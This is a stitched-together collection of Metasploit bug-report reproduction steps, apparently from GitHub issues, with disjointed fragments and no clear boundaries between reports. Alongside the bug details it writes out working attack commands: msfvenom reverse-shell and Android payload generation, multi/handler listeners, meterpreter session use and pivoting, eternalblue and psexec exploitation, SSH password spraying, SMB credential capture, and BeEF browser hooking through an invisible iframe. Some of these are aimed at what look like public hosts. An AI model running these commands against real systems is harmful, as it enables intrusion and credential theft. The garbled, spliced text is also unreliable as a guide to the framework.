`msfvenom -p linux/x64/shell/reverse_tcp -b "\\x00" lhost=1.2.3.4 lport=1234 -f elf -o ./payloads/linuxx64shell.elf` or `msfvenom -p linux/x86/shell/reverse_tcp -b "\\x00" lhost=1.2.3.4 lport=1234 -f elf -o ./payloads/linuxx86shell.elf` run the binaries: - chmod +x - run them ./linuxx64shell.elf
- run them ./linuxx86shell.elf
i tried to create an exe on msfvenom also i tried some other scripts like hacktheworld,fatrat and some other
than i started msfconsole with the rc file for the exe when my listener starts for the rc file , it doenst create any connection with my exe file
even though i checked the port its opened and working fine, payload created properly everything is fine but instead of this all my exe isnt creating any connection to my listner rc file
this issue has started like after i have updated my kali linux to 2019
before that it was working fine
can anyone help me out with this? or anyone else facing same issue?
`c:\\users\\public>systeminfo`
systeminfo ...
os name: microsoft windows server 2019 standard
os version: 10.0.17763 n/a build 17763
meterpreter > sysinfo
computer : ...
os : windows 2016 (build 17763).
architecture : x64
system language : en_us
domain : workgroup
logged on users : 3
meterpreter : x64/windows
typed "set payload windows/met" and hit the tab key
received error that killed metasploit and took me back to the terminal
reloaded metasploit and noticed that postgres wasn't running rsions.
have a host vuln to eternalblue and infected with doublepulsar
`use auxiliary/scanner/smb/smb_ms17_010`
`set rhosts ...` 4
`run` - observe output like `[!] 10.0.0.1:445 - host is likely infected with doublepulsar! - arch: x86 (32-bit), xor key: ` **or** 2
`use exploit/windowssmb/ms17_010_eternalblue`
`set rhosts ...` 4
`check` - observe output like `[!] 10.0.0.1:445 - host is likely infected with doublepulsar! - arch: x86 (32-bit), xor key: ` **then** 5
`vulns` - see there is no vuln for the infection
gained a windows/meterpreter session
prepared some files:
c:\\users\\student>echo secret > c:\\users\\student\\desktop\\hidden\\hidden.file
c:\\users\\student>echo secret > c:\\users\\student\\appdata\\hidden.file
c:\\users\\student>attrib appdata h c:\\users\\student\\appdata
c:\\users\\student>attrib c:\\users\\student\\desktop\\hidden h c:\\users\\student\\desktop\\hidden
tested `search` inside meterpreter:
meterpreter > search -d 'c:\\users\\student' -f *.file
found 1 result..
c:\\users\\student\\desktop\\hidden\\hidden.file (9 bytes)
meterpreter > search -d 'c:\\users\\student\\appdata' -f *.file
found 1 result..
c:\\users\\student\\appdata\\hidden.file (9 bytes)
msf> use auxiliary/fuzzers/ftp/client_ftp msf auxiliary (fuzzers/ftp/client_ftp)> run
`msfconsole`
configure `srvhost` and `rhosts` to point to your local host and an ssh server, respectively.
`set target 11` (on old versions, i've had to use `set target 9`)
`set payload cmd/unix/bind_netcat`
configure `username` and `password`.
optionally, set `ssh_debug` to `true`.
`run` against an ubuntu target, the ssh session has about a 50% failure rate after connecting and authenticating, during the `exec` method call.
establish meterpreter shell on victim1 for pivoting to victim2
create route in metasploit to route victim2 traffic through victim1
2.5 use auxiliary/scanner/ssh/ssh_login
set appropriate password/user files and rhosts properties
set verbose true
set password_spray true
set createsession false
set transition_delay 9
get a linux and windows meterpreter sessions
`spool <file.txt>`
`sessions -i <linux meterp>`
run commands such as `whoami` and `uname -a`
exit linux shell and meterpreter session
`sessions -i <win meterp>`
run commands such as `whoami`
exit windows cmd and meterpreter session
`spool off`
`cat <file.txt>`
linux shell commands are not captured in the file
msf5 > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 shell cmd/unix 172.22.222.136:4444 -> 172.22.222.141:41716 (172.22.222.141) 3 meterpreter x86/linux uid=33, gid=33, euid=33, egid=33 @ 172.22.222.141 172.22.222.136:4433 -> 172.22.222.141:36832 (172.22.222.141) 4 meterpreter x86/windows desktop-t6j3v2l\\msfdev @ desktop-t6j3v2l 172.22.222.136:4444 -> 172.22.222.130:49674 (172.22.222.130) msf5 > spool test-spool.txt
[*] spooling to file test-spool.txt...
msf5 > sessions -i 3
[*] starting interaction with 3..
meterpreter > shell
process 9923 created.
channel 1 created.
linux librenms 4.15.0-39-generic #42-ubuntu smp tue oct 23 15:48:01 utc 2018 x86_64 x86_64 x86_64 gnu/linux
background channel 1? [y/n] y
meterpreter > background
[*] backgrounding session 3...
msf5 > sessions -i 4
[*] starting interaction with 4..
meterpreter > shell
process 4720 created.
channel 1 created.
microsoft windows [version 10.0.15063]
(c) 2017 microsoft corporation
all rights reserved
c:\\users\\msfdev\\desktop>whoami
desktop-t6j3v2l\\msfdev c:\\users\\msfdev\\desktop>exit
meterpreter > background
[*] backgrounding session 4...
msf5 > spool off
[*] spooling is now disabled
``` spool result:
msf5 > cat test-spool.txt
[*] exec: cat test-spool.txt [*] spooling to file test-spool.txt...
msf5 > sessions -i 3
[*] starting interaction with 3..
meterpreter > shell
process 9923 created.
channel 1 created.
linux librenms 4.15.0-39-generic #42-ubuntu smp tue oct 23 15:48:01 utc 2018 x86_64 x86_64 x86_64 gnu/linux background channel 1? [y/n] meterpreter > background
[*] backgrounding session 3...
msf5 > sessions -i 4
[*] starting interaction with 4..
meterpreter > shell
process 4720 created.
channel 1 created.
microsoft windows [version 10.0.15063]
(c) 2017 microsoft corporation
all rights reserved
c:\\users\\msfdev\\desktop>whoami
desktop-t6j3v2l\\msfdev c:\\users\\msfdev\\desktop>exit
meterpreter > background
[*] backgrounding session 4...
msf5 > spool off
get a windows meterpreter session (i'm testing on the latest windows 10).
meterpreter > screenshare
the screen eventually stops updating (5~ minutes?)
created a stageless http payload: ```text
root@workstation:/opt/metasploit-framework/bin# ./msfvenom -p windows/x64/meterpreter_reverse_http lport=80 luri=/test -f exe -o /tmp/methttpx64.exe lhost=192.168.211.215
[-] no platform was selected, choosing msf::module::platform::windows from the payload
[-] no arch selected, selecting arch: x64 from the payload
no encoder or badchars specified, outputting raw payload
payload size: 207449 bytes
final size of exe file: 214016 bytes
saved as: /tmp/methttpx64.exe
created a `reverse_named_pipe` payload: ```text
root@workstation:/opt/metasploit-framework/bin# ./msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipename=mojo.1904.964.2944877358224891337 -f exe -o /tmp/metsmbx64.exe
[-] no platform was selected, choosing msf::module::platform::windows from the payload
[-] no arch selected, selecting arch: x64 from the payload
no encoder or badchars specified, outputting raw payload
payload size: 457 bytes
final size of exe file: 7168 bytes
saved as: /tmp/metsmbx64.exe
setup a listener for it in msfconsole: ```text =[ metasploit v5.0.29-dev- ]
+ -- --=[ 1897 exploits - 1068 auxiliary - 329 post ]
+ -- --=[ 547 payloads - 44 encoders - 10 nops ]
+ -- --=[ 2 evasion ] msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
payload => windows/x64/meterpreter_reverse_http
msf5 exploit(multi/handler) > set lhost 192.168.211.215
lhost => 192.168.211.215
msf5 exploit(multi/handler) > set lport 80
lport => 80
msf5 exploit(multi/handler) > set luri /test
luri => /test
msf5 exploit(multi/handler) > run [*] started http reverse handler on
executed the http payload on a windows 10 host: ```text
[*] handling request from 192.168.211.221; (uuid: za4qvnqg) redirecting stageless connection from /test/xxkm3chftslgqofcvujsawo7qm7xvgnufjuofgrmk5nbvwehw0ub5amgckczr2tm1zcf1nhajumj0d12lgdfbwj6z27f6 with ua 'mozilla/5.0 (windows nt 6.1; trident/7.0; rv:11.0) like gecko'
[*] handling request from 192.168.211.221; (uuid: za4qvnqg) attaching orphaned/stageless session...
[*] meterpreter session 1 opened (192.168.211.215:80 -> 192.168.211.221:49945) at 2019-06-17 17:54:51 -0400 meterpreter > sysinfo computer : desktop-jjpki8r
os : windows 10 (build 17763).
architecture : x64
system language : en_us
domain : workgroup
logged on users : 2
meterpreter : x64/windows
added a pivot listener to that session: ```text
meterpreter > pivot add -t pipe -l 192.168.211.221 -n mojo.1904.964.2944877358224891337 -a x64 -p windows
[+] successfully created pipe pivot.
uploaded and executed the `reverse_named_pipe` payload: ```text
meterpreter > upload /tmp/metsmbx64.exe c:\\\\users\\\\public
[*] uploading : /tmp/metsmbx64.exe -> c:\\users\\public
[*] uploaded : /tmp/metsmbx64.exe -> c:\\users\\public\\metsmbx64.exe
meterpreter > execute -f c:\\\\users\\\\public\\\\metsmbx64.exe
process 1716 created.
meterpreter > [*] meterpreter session 2 opened (pivot via [192.168.211.215:80 -> 192.168.211.221:49945]) at 2019-06-17 17:58:31 -0400
moved into session 2 and attempted to drop into an interactive shell: ```text
meterpreter > background [*] backgrounding session 1...
msf5 exploit(multi/handler) > sessions -i 2
[*] starting interaction with 2..
meterpreter > shell
process 1464 created.
channel 1 created.
terminate channel 1? [y/n] y
meterpreter > execute -i -f whoami
process 4812 created.
channel 2 created.
terminate channel 2? [y/n] y [-] error running command execute: rex::timeouterror operation timed out.
meterpreter > execute -f cmd.exe
[-] error running command execute: rex::timeouterror operation timed out.
``` rsions.
calls to `framework.db.import` will fail when using the remote data service since the `dbimportdataproxy` module has both `import` and `import_file` methods, however, the `remotedbimportdataservice` module only exposes a `import_file` method.
1) i am using metasploit-framework 5.0.28-dev and the reverse_tcp payload use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 10.0.0.1
set lport 7080
exploit -j -z 2) asap meterpreter session has been established i execute command "shell" and get following error
before fix:
meterpreter > shell
**[-] stdapi_sys_config_getenv: operation failed: 1** after fix:
meterpreter > shell
process 1 created.
channel 1 created.
``` thoughts:
i will also implement the getenv command on android, but the extra call seems unnecessary given we know it will always be /system/bin/sh.
i wonder if we can have a pty shell somehow
do we think it's worth removing (or moving to verbose) the process 1 created, channel 1 created
1) i am using metasploit-framework 5.0.28-dev and the reverse_tcp payload use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 10.0.0.1
set lport 7080
exploit -j -z 2) asap meterpreter session has been established i execute command "shell" and get following error
meterpreter > shell
**[-] stdapi_sys_config_getenv: operation failed: 1**
get a meterpreter session on windows
loadpath mosules/test
use post/test/file
set session x
create a job using `multi/handler`
try to kill the job using either `kill -k` or `kill -k 0`, where 0 is the job number
receive error `please specify valid job identifier(s)` ![screenshot](
generate linux/x64/shell_find_port payload with `msfvenom -p linux/x64/shell_find_port -f python lhost=127.0.0.1 cport=6666` 2
run shell code where rsp contents is all the current shell code expects the [rsp] value to contain a valid sockt_len, if the value at [rsp] at the time of execute is < , the syscall does succeed, but does not fill in [rsi] with valid data as the buffer length is too small
a `mov [rdx], ` or equivalent instruction after 'lea rdx, [rsp]' should do the trick ``` xor rdi,rdi xor rbx,rbx mov bl, sub rsp,rbx lea rdx,[rsp] <---- assumption here that *[rsp] >= lea rsi,[rsp+4] find_port: push ; getpeername pop rax syscall inc rdi cmp word [rsi+2], jne find_port dec rdi push 2 pop rsi
``` ## expected behaviour tcp shell spawned on existing socket ## current behaviour `find_port` loop stuck in endless loop as existing socket cannot be found ## system stuff
run an ssh login scanner against a brocade icx 6340
using proper creds, let it try to prove the attempt and start a session, get:
(2019-05-30)17:22 (s:0 j:0)msf auxiliary(scanner/ssh/ssh_login) > exploit [+] [2019.05.30-17:35:35] 192.168.2.243:22 - success: 'brocade:brocade' 'protocol error, doesn't start with scp! '
[!] [2019.05.30-17:35:35] no active db -- credential data will not be saved!
[*] command shell session 1 opened (?? -> ??) at 2019-05-30 17:35:35 -0400
[*] [2019.05.30-17:35:35] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
this culprit code is in _gather_proof_ method of lib/metasploit/framework/login_scanner/ssh.rb, returning empty as first line of the method fixes this problem and produces:
(2019-05-30)17:56 (s:3 j:0)msf auxiliary(scanner/ssh/ssh_login) > exploit [+] [2019.05.30-17:56:53] 192.168.2.243:22 - success: 'brocade:brocade' ''
[!] [2019.05.30-17:56:53] no active db -- credential data will not be saved!
[*] command shell session 4 opened (192.168.2.241:42971 -> 192.168.2.243:22) at 2019-05-30 17:56:53 -0400
[*] [2019.05.30-17:56:53] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
all ssh_session.exec calls in libraries or modules which do not explicitly, solely, target systems with full shells and ssh implementations, must be replaced with commandstream implementations
tag @wvu-r7 @h00die rsions.
admin/chromecast/chromecast_youtube
set rhost -> 192.168.1.5
exploit admin/chromecast/chromecast_reset
set rhost -> 192.168.1.5
exploit chromecast latest as of (5/27/2019)
``msfvenom -p android/meterpreter/reverse_tcp lhost=(ip) lport=1604 r > payload.apk``
install apk on target device
open app ``msfconsole``
``use multi/handler``
``set lhost (ip)``
``set lport 1604``
``exploit``
load openvas
openvas_connect admin ******** localhost 9390
openvas_report_list [this works fine] 4
openvas_report_import b9bf6aa0-ffd9-423a-956f-3c33d7d0355d nbe rsions.
just issuing the command:
msf5 > analyze 192.168.1.115 got back this: [*] analyzing 192.168.1.115...
[-] error while running command analyze: undefined method `host' for nil:nilclass call stack:
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db/analyze.rb:49:in `block in cmd_analyze'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db/analyze.rb:39:in `each'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db/analyze.rb:39:in `cmd_analyze'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>'
```nomethoderror undefined method `get_cookies' for nil:nilclass```
msf5 exploit(multi/http/moodle_cmd_exec) > msf5 exploit(multi/http/moodle_cmd_exec) > exploit [*] started reverse tcp double handler on 192.168.13.15:8000 [-] exploit failed: nomethoderror undefined method `get_cookies' for nil:nilclass
[*] exploit completed, but no session was created.
msf5 exploit(multi/http/moodle_cmd_exec) > interrupt: use the 'exit' command to quit
msf5 exploit(multi/http/moodle_cmd_exec) > interrupt: use the 'exit' command to quit
msf5 exploit(multi/http/moodle_cmd_exec) > version
framework: 5.0.21-dev-
console : 5.0.21-dev-
msf5 exploit(multi/http/moodle_cmd_exec) > interrupt: use the 'exit' command to quit
msf5 exploit(multi/http/moodle_cmd_exec) > ```
to reproduce this issue i configured a asterisk server as my iax2 provider and configured the module in the following manner: use auxiliary/scanner/voice/recorder
set iax_host [redacted]
set iax_user [redacted]
set iax_password [redacted]
set output_path /tmp
set targets 1-800-222-xxxx rsions.
after trying long enough i finally found a way to start msfconsole inside msfconsole
msfdb run rsions.
use auxiliary/dos/http/apache_range_dos.rb and the action `check`.
* connect to rpc server with pymetasploit3 library
>>> client = msfrpcclient('password') ```
* write vuln
client.call('db.report_vuln', [{'workspace':'default', 'host':'1.1.1.1', 'name':'test'}])
{'result': 'success'}
* confirm vuln is written
>>> client.call('db.vulns', [{'workspace':'default'}])
{'vulns': [{'port': none, 'proto': none, 'time': 1555626811, 'host': '1.1.1.1', 'name': 'test', 'refs': ''}]}
* attempt to delete vuln
>>> client.call('db.del_vuln', [{'workspace':'default', 'host':'1.1.1.1', name='test'}])
{'result': 'success', 'deleted': []}
* confirm vuln still exists
>>> client.call('db.vuln', [{'workspace':'default', 'host':'1.1.1.1'}])
{'vulns': [{'port': none, 'proto': none, 'time': 1555626811, 'host': '1.1.1.1', 'name': 'test', 'refs': ''}]}
relevant code:
#l1116
* connect to rpc server with pymetasploit3 library
>>> client = msfrpcclient('password') ```
* write note
client.call('db.report_note', [{'workspace':'default', 'ntype':'whatever', 'data':'whatever_data'}])
{'result': 'success'}
* confirm note is written
>>> client.call('db.notes', [{'workspace':'default', 'ntype':'whatever'}])
{\'notes\': [{\'time\': 1555618147, \'host\': \'\', \'service\': \'\', \'type\': \'whatever\', \'data\': \'"whatever_data"\'}]}
* attempt to delete note
>>> client.call('db.del_note', [{'workspace':'default', 'ntype':'whatever'}])
{'result': 'success', 'deleted': []}
* confirm note still exists
>>> client.call('db.notes', [{'workspace':'default', 'ntype':'whatever'}])
{\'notes\': [{\'time\': 1555618147, \'host\': \'\', \'service\': \'\', \'type\': \'whatever\', \'data\': \'"whatever_data"\'}]}
relevant code:
#l1158
use payload/windows/x64/meterpreter_reverse_http
set usual meterpreter payload settings
setg httpuseragent aaaaaaaaaa[...3000 a...]aaaa
generate payload
execute payload on a windows10 64 bit system affected are most likely all parameters defined in `metasploit-framework/lib/rex/payloads/meterpreter/config.rb`
use python/shell_reverse_tcp_ssl
download [test.txt](
rename `test.txt` to `test.xml` (github doesn't support `.xml` file uploads)
start `msfconsole`
run `db_status` to confirm connection to the data service
`db_import path/to/test.xml`
observe console output:
msf5 > db_import testl.xml
[*] successfully imported path/to/test.xml
observe no data was imported, e.g
`workspace -v`,`hosts`, `services`
first, i through "./msfrpcd -p test -s -f -a 0.0.0.0" to start a msf rpc services, of course it works
then, i use pymetasploit library in python to connect it, it\'s also no problem, then i call "db.connect" to connect postgres, it create some schema in my postgres,it seems all right.
3.then i execute rpc.call("auth.token_generate"), i know it will store the token to the database by document,but i can\'t get any information in table "api_keys", i really database is no problem, because when i get a meterpreter session, it can store session information to "sessions" table
why token can\'t store to the "api_keys" table hat mistake did i make hat should i call the rpc service my python code
in [2]: client = msfrpcclient(password= est )
in [3]: client.db.connect(username= ostgres , database= sf , host='127.0.0.1',password='test', port='5432', driver='postgres')
out [3]: true
in [4]: client.call("auth.token_generate")
out[4]: {\'result\': \'success\', \'token\': \'temp5221809879810272165168959285\'} i can\'t get token from "api_keys" table, why?
.msf5 auxiliary(dos/windows/ftp/iis75_ftpd_iac_bof) > options module options (auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof): name current setting required description ---- --------------- -------- ----------- rhosts 49.231.30.125 yes the target address range or cidr identifier rport 443 yes the target port (tcp) msf5 auxiliary(dos/windows/ftp/iis75_ftpd_iac_bof) > reload
[*] reloading module...
msf5 auxiliary(dos/windows/ftp/iis75_ftpd_iac_bof) > run [-] 49.231.30.125:443 - auxiliary failed: nomethoderror undefined method `strip' for nil:nilclass
[-] 49.231.30.125:443 - call stack:
[-] 49.231.30.125:443 - /usr/share/metasploit-framework/modules/auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof.rb:48:in `run'
[*] auxiliary module execution completed rsions.
db_import on vanilla list of ip addresses
ran the hosts command, no hosts listed
db_nmap on local ip range, hosts found
ran the hosts command, no hosts listed rsions.
use auxiliary/gather/shodan_search
set options
exploit rsions.
msf5 > use exploit/windows/smb/psexec
msf5 > set smbuser username
msf5 > set smbpass password
msf5 > set smbdomain test
msf5 > set rhost 192.168.0.14
msf5 > set payload windows/meterpreter/reverse_tcp
msf5 > exploit this used to work when i tried it on kali linux but now i only have my macbook air on which im trying to run this.
msf5 > use exploit/multi/http/jira_plugin_upload
msf5 exploit(multi/http/jira_plugin_upload) > set httppassword <password>
msf5 exploit(multi/http/jira_plugin_upload) > set httpusername <username>
msf5 exploit(multi/http/jira_plugin_upload) > set rhosts jira-stage.company.com
msf5 exploit(multi/http/jira_plugin_upload) > set ssl true
msf5 exploit(multi/http/jira_plugin_upload) > set payload java/shell_reverse_tcp
msf5 exploit(multi/http/jira_plugin_upload) > set lhost <lhostip>
msf5 exploit(multi/http/jira_plugin_upload) > run
* [x] start the rpc service: `ruby msfrpcd -u user -p pass`
* [x] start a rcp client: `ruby msfrpc -u user -p pass -a 0.0.0.0`
* [x] in the client, do: `rpc.call('console.create')`
* [x] in the client, do: `rpc.call('console.create')`
* [x] get exception here!!!
msf5 > use exploit/linux/http/panos_readsessionvars
msf5 exploit(linux/http/panos_readsessionvars) > set rhost mylocalip
rhost => mylocalip
msf5 exploit(linux/http/panos_readsessionvars) > exploit
msf5 > use auxiliary/scanner/ssh/ssh_login_pubkey
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set key_path ~/removed/ubuntu_id_rsa
key_path => ~/removed/ubuntu_id_rsa
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set username ubuntu
username => ubuntu
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts 10.10.10.10/24
rhosts => 10.10.10.10/24
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > run
``` rsions.
run msfconsole
firefox 26 on linux x86_64 exploit:
multi/browser/firefox_webidl_injection payload:
firefox/shell_reverse_tcp the only exploit and payload options i've changed from the default is lhost and srvhost
those i set to my ip address
i've hooked the target browser using beef.
i set up metasploit to use the above mentioned exploit and payload with said settings.
through beef i create an invisible iframe in the target browser that points to the url multi/browser/firefox_webidl_injection gives me when started.
i ran msfdb.bat init on windows 10 (build 17763.316) with latest version of metasploit framework
result of the command: creating database at c:/users/username/.msf4/db
starting database at c:/users/username/.msf4/db...success
creating database users
writing client authentication configuration file c:/users/username/.msf4/db/pg_hba.conf
stopping database at c:/users/username/.msf4/db
starting database at c:/users/username/.msf4/db...success
creating initial database schema
[?] initial msf web service account username? [username]:
[?] initial msf web service account password? (leave blank for random password):
generating ssl key and certificate for msf web service
attempting to start msf web service...failed
failed to start msf web service 2
i already comment out the msfdb file for run_cmd function like other issues had but no success
this is what write into the file pg_hba.conf host "msf" "msf" 127.0.0.1/32 md5
host "msftest" "msftest" 127.0.0.1/32 md5
host "postgres" "msftest" 127.0.0.1/32 md5
host "template1" all 127.0.0.1/32 trust
host all all 127.0.0.1/32 trust
host all all ::1/128 trust
execute a .elf file on the target system which has the linux/x86/meterpreter/reverse_tcp payload in it
once the session has been created, try to add a route using either post/multi/manage/autoroute or route add
upgrade metasploit-framework to 5.0.8-dev (using apt, in kali linux)
ssh_enumusers
the scanner fails, complaining that the action is invalid.
use auxiliary/server/socks4a
run -j rsions.
note: may impact other auxiliary/server/capture modules
load msfconsole
msf5 > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/logfile
msf5 auxiliary(server/capture/smb) > run
[-] auxiliary failed: option rhosts failed to validate.
msf5 auxiliary(server/capture/smb) > set rhosts 192.168.0.0/24
rhosts => 192.168.0.0/24
msf5 auxiliary(server/capture/smb) > run
[-] auxiliary failed: msf::missingactionerror invalid action: please use: sniffer
[-] call stack:
msf5 auxiliary(server/capture/smb) > set action sniffer action => sniffer
msf5 auxiliary(server/capture/smb) > run
[-] auxiliary failed: msf::missingactionerror invalid action: please use: sniffer
[-] call stack: rsions
## expected behaviour 1) surprised that rhosts would be required as the module shouldn't be reaching out anywhere
i guess that could be kind of cool in that maybe it limited who you were interested in, regardless, expected behaviour in case 1 would be that it isn't required and captured everything.
2) setting action should not be required as it is the only action and the default action
3) setting action should not cause error msf::missingactionerror ## current behaviour rhosts required
action failing to be recognized
no related stack trace in <user>./msf4/framework.log ## system stuff
i had a populated creds list (nothing exciting)
i ran `scanner/ssh/ssh_enumusers` on a custom users list (built from the creds list)
note: this list included a blank line if that's relavant
i ran the scanner and now my `creds` list is not working
set rhosts to a list of hosts that are listening on 30718 ```
msf5 auxiliary(scanner/telnet/lantronix_telnet_password) > set <snip> rhosts file:/tmp/list rport 30718
when the scanner finds a password, it shows the password, as expected, and then crashes
if no password is set, it keeps scanning, as expected
msf5 auxiliary(scanner/telnet/lantronix_telnet_password) > run [+] 172.12.34.567 - telnet password found: 1234
[-] auxiliary failed: nomethoderror undefined method `id' for nil:nilclass
[-] call stack:
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/report.rb:84:in `myworkspace_id'
[-] /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/telnet/lantronix_telnet_password.rb:80:in `run_host'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed
``` rsions.
generate the payload
msfvenom -p windows/x64/vncinject/bind_tcp lport=4445 vnchost=127.0.0.1 vncport=5900 -f exe -o winrdp.exe
run payload on the victim machine (windows server 2012 r2 x64)
use exploit/multi/handler set payload windows/x64/vncinject/bind_tcp
set vnchost 47.107.171.219
set vncport 5900
set lport 4445
set rhost 27.*.*.911
start msfconsole and connect to the metasploit web service
start with an empty workspace
pick some known hosts and their respective credentials
setup `auxiliary/scanner/smb/smb_login` to run against the hosts and credentials
run and observe successful login(s) shown in the console
query the metasploit web service and observe `null` state ` name]`
{ "id": 67, "address": "10.20.39.55", "name": null,
--->"state": null,<--- "service_count": 1, "os_family": null, [other fields left out for brevity]
msf5 > load wmap .-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[wmap 1.5.1] === et [ ] metasploit.com 2012
[*] successfully loaded plugin: wmap
msf5 > wmap_sites -a
[*] site created.
msf5 > wmap_sites -l
[*] available sites
=============== id host vhost port proto # pages # forms -- ---- ----- ---- ----- ------- ------- msf5 > ```
it runs with no error, but the site list is always empty
if it works well, the site i created will show in the list
now i cannot add a site by its ip or url
(things like db_nmap works well.) there's no new error log while doing the operations above.
point the scanner/mssql/mssql_login scanner at a box which isn't running mssql
run it rsions.
open multiple sessions, for instance by using `exploit/multi/handler` and opening a bunch of connections with `nc`
try to kill these sessions using a range like `sessions -k 1-10` or `sessions -k 1..10`
find a server with http digest authentication
`curl -i --anyauth -u user:pass `
**verify** that it worked
use auxiliary/scanner/http/http_login
set verbose true
set userpass_file /path/to/creds
set user_file /dev/null
set pass_file /dev/null
notice `[-] <ip>:<port> - failed: <creds>` in output
crash is unpredictable, but always occurs shortly after starting msf console via either "msfdb run" or "service postgresql start; msfconsole."
setup a perfect vulnerable old version of samba on a debian machine
execute some "old" samba exploits for linux (e.g
lsa_transnames or trans2open) rsions.
get any meterpreter session (currently python)
create a 4.1 gb file: `dd if=/dev/zero of=lol4gb bs=4m count=1025`
`meterpreter > ls` in the directory where you created `log4gb`
### auxiliary module
msf5 auxiliary(scanner/http/apache_activemq_source_disclosure) > use admin/http/joomla_registration_privesc
msf5 auxiliary(admin/http/joomla_registration_privesc) > options module options (auxiliary/admin/http/joomla_registration_privesc): name current setting required description ---- --------------- -------- ----------- email example@youremail.com yes email to receive the activation code for the account password expl0it3r yes password for the username proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 10.181.0.122/24 yes the target address range or cidr identifier rport 80 yes the target port (tcp) ssl false no negotiate ssl/tls for outgoing connections targeturi / yes the relative uri of the joomla instance username expl0it3r yes username that will be created vhost no http server virtual host msf5 auxiliary(admin/http/joomla_registration_privesc) > set verbose true
verbose => true
msf5 auxiliary(admin/http/joomla_registration_privesc) > run [-] auxiliary failed: socketerror getaddrinfo: nodename nor servname provided, or not known
[-] call stack:
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:189:in `gethostbyname'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:189:in `getaddresses'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:173:in `getaddress'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:263:in `resolv_nbo'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:277:in `resolv_nbo_i'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/switch_board.rb:233:in `best_comm'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/switch_board.rb:127:in `best_comm'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:195:in `initialize'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:38:in `new'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:38:in `from_hash'
[-] /users/green/.rvm/gems/ruby-2.5.3@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/tcp.rb:28:in `create'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:177:in `connect'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:244:in `send_request'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:229:in `_send_recv'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:210:in `send_recv'
[-] /users/green/msfdev/metasploit-framework/lib/msf/core/exploit/http/client.rb:367:in `send_request_cgi'
[-] /users/green/msfdev/metasploit-framework/modules/auxiliary/admin/http/joomla_registration_privesc.rb:45:in `check'
[-] /users/green/msfdev/metasploit-framework/modules/auxiliary/admin/http/joomla_registration_privesc.rb:79:in `run'
[*] auxiliary module execution completed ```
### exploit module
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set lhost 10.103.0.30
lhost => 10.103.0.30
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set rhosts 8.8.8.8/32
rhosts => 8.8.8.8/32
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > run [*] started reverse tcp handler on 10.103.0.30:4444
[-] exploit failed: socketerror getaddrinfo: nodename nor servname provided, or not known
[*] exploit completed, but no session was created.
msf5 exploit(linux/http/apache_couchdb_cmd_exec) >
``` ## after fix ### auxiliary module
msf5 auxiliary(gather/drupal_openid_xxe) > use auxiliary/gather/drupal_openid_xxe msf5 auxiliary(gather/drupal_openid_xxe) > run [*] using url:
[*] local ip:
[*] server started.
[*] server stopped.
[*] using url:
[*] local ip:
